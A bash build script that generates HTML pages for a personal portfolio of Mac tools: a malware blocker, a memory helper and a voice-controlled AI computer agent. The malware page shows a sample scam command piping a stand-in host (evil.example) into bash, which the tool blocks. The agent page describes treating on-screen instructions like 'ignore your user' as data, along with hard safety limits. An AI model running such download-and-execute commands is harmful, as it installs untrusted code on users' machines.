#!/bin/bash
# Builds the three pages from shared header and footer.
cd "$(dirname "$0")"
H='<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="robots" content="noindex, nofollow, noarchive"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,300..600,0..100,0..1&family=Courier+Prime:ital,wght@0,400;0,700;1,400&family=IBM+Plex+Mono:wght@400;500&family=Instrument+Sans:wght@400;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/style.css?v=19">'
TOP='<div class="wrap"><header class="top"><a class="name" href="/">Reed Ostrov</a><nav class="toplinks mono"><a href="https://github.com/Questboy23">GitHub</a><a href="https://www.linkedin.com/in/reedostrov">LinkedIn</a><a href="https://www.instagram.com/reedostrov">Instagram</a><a href="mailto:personguy976@gmail.com">Email</a></nav></header>'
FOOT='<footer><span>Reed Ostrov</span><nav class="footlinks"><a href="https://github.com/Questboy23">GitHub</a><a href="https://www.linkedin.com/in/reedostrov">LinkedIn</a><a href="https://www.instagram.com/reedostrov">Instagram</a><a href="mailto:personguy976@gmail.com">Email</a></nav></footer></div></body></html>'

cat > index.html <<EOF
$H<title>Reed Ostrov</title><meta name="description" content="Reed Ostrov's projects and links."></head><body>$TOP
<main class="home"><h1 class="label">Projects</h1><div class="grid">
<a class="card glass lev" href="/leviathan/"><span class="icon lev"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3zm-1.2 14.2-3.5-3.5 1.4-1.4 2.1 2.1 4.9-4.9 1.4 1.4-6.3 6.3z"/></svg></span><h2>Leviathan</h2><p>Stops malware on your Mac before it runs.</p><span class="pill">Learn more &rarr;</span></a>
<a class="card glass am" href="/activity-monitored/"><span class="icon am"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 4a10 10 0 0 0-10 10c0 1.7.4 3.3 1.2 4.7l1.7-1A8 8 0 1 1 20 14c0 1.4-.4 2.7-1 3.8l1.7 1A10 10 0 0 0 12 4zm4.2 4.4-5.6 4.4a2 2 0 1 0 2.8 2.8l2.8-7.2z"/></svg></span><h2>Activity Monitored</h2><p>Stops the out-of-memory window that pauses your apps.</p><span class="pill">Learn more &rarr;</span></a>
<a class="card glass" href="/voice-computer-agent/"><span class="icon" style="background:#2f9e57"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.9V21h2v-3.1a7 7 0 0 0 6-6.9h-2z"/></svg></span><h2>Voice Computer Agent</h2><p>Tell your Mac what to do, and it does it.</p><span class="pill">Learn more &rarr;</span></a>
<a class="card glass" href="/tone/"><span class="icon" style="background:#c9a14a"><svg viewBox="0 0 24 24" fill="none" stroke="#f8f2e6" stroke-width="2.2" stroke-linecap="round"><path d="M2 12h2l2-6 3 12 3-15 3 18 3-12 2 3h2"/></svg></span><h2>Tone</h2><p>Learn any instrument&rsquo;s sound from a song. Play it, swap it, export it.</p><span class="pill">Open &rarr;</span></a>

</div><h1 class="label" style="margin-top:56px">Links</h1><ul class="links"><li><a href="https://github.com/Questboy23"><b>GitHub</b><span>Questboy23</span></a></li><li><a href="https://www.linkedin.com/in/reedostrov"><b>LinkedIn</b><span>reedostrov</span></a></li><li><a href="https://www.instagram.com/reedostrov"><b>Instagram</b><span>@reedostrov</span></a></li><li><a href="mailto:personguy976@gmail.com"><b>Email</b><span>personguy976<wbr>@gmail.com</span></a></li></ul></main>$FOOT
EOF

cat > leviathan/index.html <<EOF
$H<title>Leviathan</title><meta name="description" content="Leviathan stops viruses on a Mac before they run."></head><body>$TOP
<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
<section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--sea)"></i>Project 01 &middot; macOS &middot; v4.0</div><h1 class="serif" style="margin-top:16px">Leviathan</h1><p class="lede serif">It stops viruses on your Mac before they run.</p>
<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div><p class="note">Double-click the zip in Downloads, then double-click <b>Install Leviathan.command</b>. The first time, macOS blocks it because it is not from the App Store: open System Settings, Privacy &amp; Security, scroll down, click <b>Open Anyway</b>, then double-click it again. It needs <a href="https://brew.sh">Homebrew</a>. The shield appears in your menu bar.</p></div>
<figure class="win" aria-label="Example of the paste guard"><div class="bar"><i></i><i></i><i></i><span>Terminal</span></div><pre class="scr"><span class="dim">$</span> curl -s evil.example/fix | bash
<b>Leviathan stopped this command.</b>
It downloads a program and runs it
straight away. Scam pages ask for this.
<span class="dim">Press Enter again to run it anyway.</span></pre></figure></section>

<section class="blk glass"><h3 class="serif">What it does</h3><div class="prose"><p>Leviathan checks everything new on your Mac for viruses: downloads, apps, and programs that set themselves to start at login. It also stops scam commands pasted into Terminal, and blocks known malware websites in every app.</p><p>It runs a check every hour and whenever your Downloads, Applications or startup folders change. The rest of the time it uses no CPU. When it steps in, it tells you what it found and why, and every action can be undone.</p></div></section>

<section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
<h4>1. Harmful downloads get locked away</h4><p>New files in Downloads and new apps are checked with the same malware rules Apple ships in macOS (XProtect), Apple&rsquo;s list of developers it has banned, and a list of known malware sites the file came from. A match goes to the Trash with its permission to run removed, so it cannot open even from there. <code>leviathan undo</code> puts it back. Apps Apple never checked are only noted in the log, because unsigned does not mean harmful.</p>
<h4>2. Fake startup items get switched off</h4><p>A program that sets itself to start at login while pretending to be Apple, or hides unsigned in a secret folder, is switched off and moved out. Undoable.</p>
<h4>3. Pasted scam commands get stopped</h4><p>A popular scam asks you to paste a line into Terminal to &ldquo;fix&rdquo; something. Leviathan stops commands that download and run code, unscramble hidden code, remove Apple&rsquo;s safety check, or draw a fake password box. It explains the risk once; press Enter again to run it anyway.</p>
<h4>4. Bad websites never load</h4><p>A standard macOS profile sends every website lookup, encrypted, to Quad9 (9.9.9.9). Known malware and phishing sites fail to load, in every app. Legal sites stay open. Remove the profile in System Settings any time.</p>
<h4>5. Is this a virus?</h4><p><code>leviathan check File</code> answers in plain words. <code>leviathan pkg File.pkg</code> shows what an installer&rsquo;s scripts will do before you run it.</p>
<h4>6. A shield in your menu bar</h4><p>White while Leviathan waits, green while a scan runs, orange when it has a warning you have not seen.</p></div></section>

<section class="blk glass"><h3 class="serif">Why it&rsquo;s useful</h3><ul class="pros">
<li><span class="k">01</span><div><b>Covers the tricks antivirus misses</b><span>Fake sites and pasted commands are how most Mac malware spreads today.</span></div></li>
<li><span class="k">02</span><div><b>Every action can be undone</b><span>Each step is written to a tamper checked log, and <code>leviathan undo</code> puts any file or setting back.</span></div></li>
<li><span class="k">03</span><div><b>Private by design</b><span>No account, no tracking, and nothing about you is sent anywhere.</span></div></li>
<li><span class="k">04</span><div><b>Free forever</b><span>No subscription. The full source code is public.</span></div></li>
</ul></section>

<section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above, then double-click the zip in your Downloads folder to unzip it.</span></div></li>
<li><span class="k">2</span><div><b>Open Terminal</b><span>Press Cmd and Space, type Terminal, press Return.</span></div></li>
<li><span class="k">3</span><div><b>Run the installer</b><span>Type <code>bash </code> with a space, drag <code>install.sh</code> from the unzipped folder into the window, and press Return. No password needed.</span></div></li>
<li><span class="k">4</span><div><b>Turn on the website filter</b><span>System Settings opens at the end. Double-click Leviathan website filter, click Install, and enter your Mac password.</span></div></li>
</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>cd ~ &amp;&amp; curl -fsSL https://github.com/Questboy23/leviathan/archive/refs/tags/v4.0.0.tar.gz | tar xz &amp;&amp; bash leviathan-4.0.0/install.sh</code></pre></div></section>
$FOOT
EOF

cat > activity-monitored/index.html <<EOF
$H<title>Activity Monitored</title><meta name="description" content="Activity Monitored stops the macOS out-of-memory window that pauses your apps."></head><body>$TOP
<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
<section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--mustard)"></i>Project 02 &middot; macOS</div><h1 class="serif" style="margin-top:16px">Activity Monitored</h1><p class="lede serif">Stops the &ldquo;Your system has run out of application memory&rdquo; window that pauses your apps.</p>
<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/releases/latest/download/Activity-Monitored.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div><p class="note">Double-click the zip in Downloads, then double-click <b>Install Activity Monitored.command</b>. The first time, macOS blocks it because it is not from the App Store: open System Settings, Privacy &amp; Security, scroll down, click <b>Open Anyway</b>, then double-click it again. It runs in the background from then on; type <code>monitored</code> in Terminal to see what it did.</p></div>
<figure class="win" aria-label="Example of Activity Monitored at work"><div class="bar"><i></i><i></i><i></i><span>Activity Monitored</span></div><pre class="scr">Disk free  <span class="meter"><i style="width:12%"></i></span> 22 GB
<b>Below the 30 GB target. Clearing download caches.</b>
  uv cache     6.1 GB freed
  pip cache    0.4 GB freed
<span class="dim">29 GB free. Room for swap again.</span></pre></figure></section>

<section class="blk glass"><h3 class="serif">What it does</h3><div class="prose"><p>When RAM is full, macOS moves memory into swap files on your disk. When the disk is nearly full, it can&rsquo;t make more swap, so it pauses your apps and lists them in red. Activity Monitored keeps that from happening.</p></div></section>

<section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
<h4>1. It keeps disk room for swap</h4><p>Once a minute it checks free disk space. Below the target (30 GB, you can pick the number) it runs the official cleanup commands of uv, pip and npm. Each one deletes only that tool&rsquo;s download cache, which the tool downloads again when needed. Nothing else is ever deleted, and <code>monitored clean off</code> turns it off.</p>
<h4>2. It warns you before apps freeze</h4><p>Under 15 GB free, or when memory stays critical for 30 seconds, it shows a notification banner. The memory banner names the 3 biggest programs so you can quit one. At most one banner per kind every 30 minutes. Under 10 GB free, or with memory exhausted, it also shows an alert that closes itself after 60 seconds, because Focus mode hides banners.</p>
<h4>3. It keeps the app in front smooth</h4><p>When the processor is over 75% busy, it moves busy background command-line programs to macOS&rsquo;s low priority lane. Apps with windows, Logic, music, calls and Claude are never touched. Each one returns to normal when the processor calms down, after 10 minutes at most, and by a separate timer even if Activity Monitored crashes.</p>
<h4>4. It pauses before macOS does</h4><p>When macOS reports critical memory pressure (or a warning with under 10 GB of disk) for 10 seconds, it pauses the biggest program you are not using, 500 MB or more, scripts before apps, at most 3 at once. A paused program keeps all its work and stops taking memory, so macOS can compress or swap it out. A banner names what was paused. Never paused: the app in front and everything it started, Claude, Logic, music, calls, Terminal and system programs. Each one resumes when memory is normal, after 30 minutes at most, and by a separate timer even if Activity Monitored crashes. <code>monitored resume</code> resumes everything right away.</p>
<h4>What it never does</h4><p>It never quits, kills, deletes or rewrites any program or file (the cache cleanup above aside). Pausing does not free RAM on the spot: it stops growth and lets macOS move memory out. It can&rsquo;t free space your own files take, and it can&rsquo;t add RAM: if your files fill the disk or too many big programs are open, it tells you.</p></div></section>

<section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above, then double-click the zip in your Downloads folder to unzip it.</span></div></li>
<li><span class="k">2</span><div><b>Open the installer</b><span>In the unzipped folder, right click <code>Install Activity Monitored.command</code> and choose Open.</span></div></li>
<li><span class="k">3</span><div><b>That&rsquo;s it</b><span>It starts now and every time you log in. If your Mac offers to install developer tools, click Install, then repeat step 2.</span></div></li>
</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>curl -fsSL https://raw.githubusercontent.com/Questboy23/activity-monitored/main/install.sh | bash</code></pre></div></section>
$FOOT
EOF

mkdir -p voice-computer-agent
cat > voice-computer-agent/index.html <<EOF
$H<title>Voice Computer Agent</title><meta name="description" content="Tell your Mac what to do. Voice Computer Agent does it on screen while you watch, or in the background while you sleep, inside hard limits you set."><style>.vt{width:100%;border-collapse:collapse;font-size:15px}.vt th,.vt td{text-align:left;padding:10px 8px;border-bottom:1px solid rgba(128,128,128,.25);vertical-align:top}.vt th{font-weight:600}.dia{width:100%;height:auto;display:block;margin-top:8px}.dia text{font:13px "Instrument Sans",sans-serif;fill:currentColor}.dia .s{font-size:11px;opacity:.75}.dia rect{fill:none;stroke:currentColor;stroke-opacity:.45;rx:10}.dia .g{stroke:#3fbf6a;stroke-opacity:.9}.dia path{stroke:currentColor;stroke-opacity:.5;fill:none;marker-end:url(#ar)}pre{overflow-x:auto}</style></head><body>$TOP
<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
<section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:#3fbf6a"></i>Project 03 &middot; macOS &middot; early test build</div><h1 class="serif" style="margin-top:16px">Voice Computer Agent</h1><p class="lede serif">Tell your Mac what to do. It does it on screen while you watch, or in the background while you sleep.</p>
<div class="actions"><a class="btn" href="/voice-computer-agent/VoiceComputerAgent.zip" download>Download for Mac <span aria-hidden="true">&darr;</span></a></div><p class="note">Early test build for macOS on Apple silicon. Free mode is still weak; Claude mode works best.</p></div>
<figure class="win" aria-label="Example of the agent at work"><div class="bar"><i></i><i></i><i></i><span>Voice Computer Agent</span></div><pre class="scr"><span class="dim">You (holding Right Option):</span> get me to my Chrome extensions
<b>Step 1  click  the puzzle piece icon</b>
<b>Step 2  click  Manage extensions</b>
<span class="dim">Done in 2 steps. Replays free next time.</span></pre></figure></section>

<section class="blk glass"><h3 class="serif">What it does</h3><div class="prose"><p>You hold a key and say what you want, such as &ldquo;get me to my Chrome extensions&rdquo; or &ldquo;what should I do next on this page&rdquo;. You can also type the goal into a box. The agent looks at your screen, picks one step, does it, looks again, and repeats until the job is finished.</p><p>It can point while you click, click for you while you watch, or work in the background inside limits you set before bed. A very faint green glow around the edge of the screen shows it is on. Press Escape and it stops at once.</p></div></section>

<section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
<p>The whole agent is one function called again and again: <code>next_action(goal, screen)</code>. It takes your goal and the current screen and returns exactly one action, such as &ldquo;click here&rdquo;, &ldquo;type this&rdquo; or &ldquo;done&rdquo;.</p>
<h4>1. You give a goal</h4><p><b>In:</b> your voice (press Right Option to start, press it again to send), or text in the goal box. <b>Out:</b> one line of text. Speech becomes text on your Mac with whisper.cpp. The microphone is only on between the two presses.</p>
<h4>2. It looks at the screen</h4><p><b>In:</b> the screen. <b>Out:</b> one small screenshot, kept in memory and never saved, plus the names of the buttons and fields macOS reports. Text on the screen is treated as data only. A web page that says &ldquo;ignore your user&rdquo; gets no say.</p>
<h4>3. It picks one action</h4><p><b>In:</b> the goal and the screen. <b>Out:</b> one action in a strict format. Any reply that is not exactly one valid action is thrown away. Free mode asks a model on your Mac. Claude mode asks Claude.</p>
<h4>4. Safety check</h4><p><b>In:</b> the action and what is on screen. <b>Out:</b> go, ask first, or blocked. Sending, deleting and settings changes need your yes. Password fields, payment fields, password managers, Keychain, System Settings and banking sites are always off limits.</p>
<h4>5. It acts</h4><p><b>In:</b> an approved action. <b>Out:</b> a mouse click, keystrokes or a scroll. In guide mode it only draws a ring around the spot, and the up and down arrow keys step through the plan. In background mode it presses buttons inside one app without moving your mouse.</p>
<h4>6. It remembers what worked</h4><p>When a task succeeds, its steps are saved. Next time it replays them with no AI calls. Before each replayed step it checks that the screen still matches. Anything you typed is never saved.</p>
<svg class="dia" viewBox="0 0 760 300" role="img" aria-label="Diagram: push-to-talk mic or goal box gives a goal; screen capture and accessibility give the screen; next_action uses a local model or Claude; the safety gate passes actions to mouse and keyboard or to background press; a separate watchdog listens for Escape and stops everything; the replay cache skips the model for known tasks."><defs><marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0L10 5L0 10z" fill="currentColor" stroke="none"/></marker></defs>
<rect x="10" y="20" width="150" height="54"/><text x="22" y="43">Push-to-talk mic</text><text class="s" x="22" y="62">or typed goal box</text>
<rect x="10" y="110" width="150" height="54"/><text x="22" y="133">Screen capture</text><text class="s" x="22" y="152">+ button names (AX)</text>
<rect x="215" y="62" width="170" height="60" class="g"/><text x="228" y="86">next_action(goal, screen)</text><text class="s" x="228" y="106">returns one action</text>
<rect x="215" y="160" width="80" height="54"/><text x="225" y="183">Local model</text><text class="s" x="225" y="201">free mode</text>
<rect x="305" y="160" width="80" height="54"/><text x="315" y="183">Claude</text><text class="s" x="315" y="201">Claude mode</text>
<rect x="430" y="62" width="130" height="60"/><text x="442" y="86">Safety gate</text><text class="s" x="442" y="106">go / ask / block</text>
<rect x="605" y="20" width="145" height="54"/><text x="617" y="43">Mouse + keyboard</text><text class="s" x="617" y="62">auto mode</text>
<rect x="605" y="96" width="145" height="54"/><text x="617" y="119">Ring + arrow keys</text><text class="s" x="617" y="138">guide mode</text>
<rect x="605" y="172" width="145" height="54"/><text x="617" y="195">Press inside one app</text><text class="s" x="617" y="214">background mode</text>
<rect x="430" y="160" width="130" height="54"/><text x="442" y="183">Replay cache</text><text class="s" x="442" y="201">no AI calls</text>
<rect x="10" y="236" width="740" height="52" class="g"/><text x="22" y="258">Watchdog: separate process with its own Escape listener</text><text class="s" x="22" y="277">kills the agent, clears the queue, removes the green glow. The agent cannot press Escape or change its own settings.</text>
<path d="M160 47 L213 80"/><path d="M160 137 L213 104"/><path d="M265 122 L258 158"/><path d="M335 122 L342 158"/><path d="M385 92 L428 92"/><path d="M560 80 L603 50"/><path d="M560 92 L603 120"/><path d="M560 104 L603 195"/><path d="M495 160 L495 124"/></svg></div></section>

<section class="blk glass"><h3 class="serif">Three ways to use it</h3><div class="prose feats">
<h4>Guide: it points, you click</h4><p>A ring shows what to click next. Up and down arrows step forward and back. Nothing is clicked for you.</p>
<h4>Auto: it clicks while you watch</h4><p>It moves the mouse and types on your screen. A faint green glow sits around the screen edge the whole time.</p>
<h4>Overnight: full control inside hard limits</h4><p>Before bed you list the jobs and set the limits: hours, AI tokens and steps. You type GRANT to confirm. It works through the list, in the background inside one app if you choose. While it works in the background, the green glow slowly breathes and a small label at the top says &ldquo;Working in background&rdquo; with the app&rsquo;s name. Anything that needs your yes, such as sending or deleting, waits in a list for the morning unless you allowed it.</p>
<pre><code>vca grant --goal "sort my Downloads folder into folders" --goal "draft replies to unread mail" --hours 8 --max-tokens 200000 --app Mail
vca overnight
vca held      # in the morning: what waited for you
vca revoke    # cancel the grant at any time</code></pre>
<p>These limits hold in every mode and no setting can turn them off: it never spends money (no buying, paying, checkout, subscribing, donating, transfers or adding cards), never types into password or payment fields, never touches password managers, Keychain, System Settings or banking sites, and never presses Escape or changes its own settings. A grant lasts at most 12 hours.</p></div></section>

<section class="blk glass"><h3 class="serif">Free mode and Claude mode</h3><table class="vt"><tr><th></th><th>Free mode</th><th>Claude mode</th></tr>
<tr><td>Where the AI runs</td><td>On your Mac (Ollama, Qwen 3.5 9B)</td><td>Anthropic&rsquo;s servers (Claude Sonnet)</td></tr>
<tr><td>What leaves your Mac</td><td>Nothing. Tested with the internet blocked.</td><td>One shrunken screenshot and the button names per step</td></tr>
<tr><td>Cost</td><td>&#36;0</td><td>Counts against your Claude plan&rsquo;s usage limit, about 1,000 tokens per step on Haiku. No extra money.</td></tr>
<tr><td>Speed per step</td><td>7 to 15 seconds once loaded (first call 83 s)</td><td>About 4.5 seconds (n=2 single calls)</td></tr>
<tr><td>Best for</td><td>Simple, repeated tasks and private screens</td><td>Harder, unfamiliar tasks</td></tr></table>
<p class="note">Other AI companies can plug in through the same provider interface: one class with one method.</p></section>

<section class="blk glass"><h3 class="serif">Connecting it to Claude</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Install Claude Code</b><span>Install it from claude.com/code.</span></div></li>
<li><span class="k">2</span><div><b>Sign in once</b><span>Run <code>claude</code> in Terminal and sign in with your Claude account. Claude mode then uses your plan&rsquo;s usage limit. No API key and no extra bill.</span></div></li>
<li><span class="k">3</span><div><b>Say yes once</b><span>The first Claude-mode run explains what is sent and asks for your consent. Free mode never asks, because nothing leaves your Mac.</span></div></li>
<li><span class="k">4</span><div><b>Run it</b><span><code>vca run --provider claude --mode auto --goal "get me to my Chrome extensions"</code></span></div></li></ol></div></section>

<section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Download and unzip</b><span>Click Download for Mac above, then double-click the zip in your Downloads folder to unzip it.</span></div></li>
<li><span class="k">2</span><div><b>Get the tools</b><span>Install Homebrew from brew.sh, then run <code>brew install uv cmake</code> in Terminal.</span></div></li>
<li><span class="k">3</span><div><b>Run the installer</b><span>Type <code>bash </code> with a space, drag <code>install.sh</code> from the unzipped folder into Terminal, and press Return. It adds the menu bar ring and starts it at login.</span></div></li>
<li><span class="k">4</span><div><b>Allow permissions</b><span>System Settings, Privacy &amp; Security: turn on Accessibility and Screen Recording for Voice Computer Agent. Under Menu Bar, allow it so the ring shows.</span></div></li>
<li><span class="k">5</span><div><b>Optional free AI</b><span>Install Ollama from ollama.com, then run <code>ollama pull qwen3.5:9b</code> (about 8 GB).</span></div></li>
<li><span class="k">6</span><div><b>Go</b><span>Click the ring, then Check setup. Then press Right Option, speak, and press it again. Escape stops it.</span></div></li></ol></div></section>

<section class="blk glass"><h3 class="serif">Measured so far</h3><ul class="pros">
<li><span class="k">01</span><div><b>178 automated tests pass</b><span>Covering the action format, safety checks, money block, overnight limits, kill switch, push-to-talk toggle and replay cache (including the safety check on every replayed step). 1 needs screen permission and was skipped.</span></div></li>
<li><span class="k">02</span><div><b>Escape: 0 actions after 20 of 20 real key presses</b><span>Stop took 6 to 189 ms, median about 18 ms.</span></div></li>
<li><span class="k">03</span><div><b>Free mode works offline</b><span>With all internet blocked, the local model returned a valid action 3 of 3 times, about 260 tokens each.</span></div></li>
<li><span class="k">04</span><div><b>Not measured yet</b><span>Success rate on 10 real everyday tasks per mode. The first free-mode attempt was thrown out: another app kept taking the front while it ran.</span></div></li>
</ul></section>
$FOOT
EOF
